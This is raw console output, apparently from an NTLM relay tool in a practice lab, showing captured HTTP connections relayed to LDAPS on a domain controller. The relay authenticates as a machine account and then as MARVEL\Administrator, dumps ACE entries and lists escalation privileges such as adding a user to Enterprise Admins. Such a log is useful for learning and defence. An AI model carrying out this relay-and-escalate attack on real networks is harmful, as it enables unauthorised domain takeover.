[*] HTTPD: Client requested path: fe3cr.delivery.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: fe3cr.delivery.mp.microsoft.com:443
[*] HTTPD: Client requested path: fe3cr.delivery.mp.microsoft.com:443
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\PUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: tsfe.trafficshaping.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Client requested path: login.live.com:443
[-] Authenticating against ldaps://192.168.176.129 as \ FAILED
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Client requested path: login.live.com:443
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\Administrator SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting.
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.live.com:443
[*] HTTPD: Client requested path: login.live.com:443
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\PUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: settings-win.data.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: settings-win.data.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: settings-win.data.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: tsfe.trafficshaping.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: settings-win.data.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: settings-win.data.microsoft.com:443

```
